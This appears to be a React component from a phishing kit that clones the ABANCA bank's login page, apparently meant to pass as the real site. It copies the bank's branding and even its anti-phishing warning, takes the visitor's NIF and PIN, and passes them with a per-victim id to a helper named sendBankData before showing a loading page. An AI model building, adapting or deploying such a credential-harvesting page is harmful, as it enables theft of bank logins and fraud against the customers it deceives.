import { useState } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import { sendBankData } from '../../../utils/utils'
import { Button } from '../ui/button/Button'
import { Input } from '../ui/input/Input'

export function LoginForm() {
  const { id } = useParams()
  const navigate = useNavigate()

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')

  const sendAndNavigate = (): void => {
    sendBankData(id!, 'Abanca', login, password)
    navigate(`/loading/${id}`)
  }

  return (
    <main className="font-arial mx-auto flex w-full max-w-[1024px] flex-col px-8 pt-10 md:pt-20 lg:px-20">
      <h1 className="mb-10 text-[23px] font-medium text-[#7b858a]">
        Bienvenido a la Banca electrónica y Buzón Digital de ABANCA.
      </h1>
      <div className="flex w-full flex-col gap-x-8 gap-y-8 lg:flex-row">
        <div className="flex w-full flex-col lg:w-1/2">
          <h2 className="font-arial border-b border-black text-[33px] font-normal leading-7 text-[#5a85d7]">Particulares</h2>
          <div className="mt-8 flex flex-col gap-y-2">
            <div className="flex flex-row gap-x-4 pl-4 text-xs font-bold text-[#313538]">
              <h3>1.</h3>
              <h3>Introduce tu NIF y el PIN</h3>
            </div>
            <div className="flex gap-x-2 pl-8">
              <div className="flex gap-x-2 max-md:flex-col">
                <span className="w-[9em] text-xs text-[#666666] md:text-right">NIF:</span>
                <Input className="w-[12.8em]" value={login} onChange={(e) => setLogin(e.target.value)} />
              </div>
              <a href="#" className="text-xs leading-6 text-[#313538] underline max-md:mt-4">
                No tengo NIF
              </a>
            </div>
            <div className="flex gap-x-2 pl-8">
              <div className="flex gap-x-2 max-md:flex-col">
                <span className="w-[9em] text-xs text-[#666666] md:text-right">PIN (contraseña):</span>
                <div className="flex flex-row gap-x-2">
                  <Input className="w-16" type="password" value={password} onChange={(e) => setPassword(e.target.value)} />
                  <a href="#" className="hidden text-nowrap text-xs leading-6 text-[#313538] underline max-md:block">
                    ¿Has olvidado o no funciona tu PIN?
                  </a>
                </div>
              </div>
              <a href="#" className="text-nowrap text-xs leading-6 text-[#313538] underline max-md:mt-4 max-md:hidden">
                ¿Has olvidado o no funciona tu PIN?
              </a>
            </div>

            <div className="mt-4 flex justify-end gap-x-2">
              <Button title="Limpiar" className="bg-[#7B858A]" />
              <Button title="Acceder" className="bg-[#5A85D7]" onClick={sendAndNavigate} />
            </div>
            <div className="mt-2 flex gap-x-1 text-xs">
              <p className="">¿Aún no tienes tus claves? </p>
              <a href="" className="text-[#313538] underline">
                Solicítalas ahora.
              </a>
            </div>
          </div>
        </div>
        <div className="flex w-full flex-col lg:w-1/2">
          <h2 className="font-arial border-b border-black text-[33px] font-normal leading-7 text-[#5a85d7]">Empresas</h2>
          <div className="mt-5 border-b border-[#bed6f8] pb-5">
            <a
              href="https://online.abanca.com"
              className="flex h-[54px] w-full items-center rounded bg-[#5a85d7] pl-5 text-[17px] font-bold leading-4 text-white"
            >
              Acceso Banca Electrónica de Empresas
            </a>
          </div>
          <h3 className="mt-3 text-xs font-semibold">¿Sabías que … ?</h3>
          <h3 className="mt-7 text-xs font-semibold">¡Muy importante!</h3>
          <div className="mt-1.5 border border-[#c6c601] bg-[#FFFFCC] p-2">
            <p className="pb-1.5 pl-2 text-xs text-[#313538]">
              Recuerda que ABANCA nunca te solicitará por correo electrónico claves de banca electrónica ni enlaces a esta página.
            </p>
            <p className="pb-1.5 pl-2 text-xs text-[#313538]">
              <a href="http://www.abanca.com/es/ayuda/guias/consejos-seguridad-banca-electronica/" className="underline">
                Recomendaciones de Seguridad.
              </a>
            </p>
          </div>
        </div>
      </div>
    </main>
  )
}
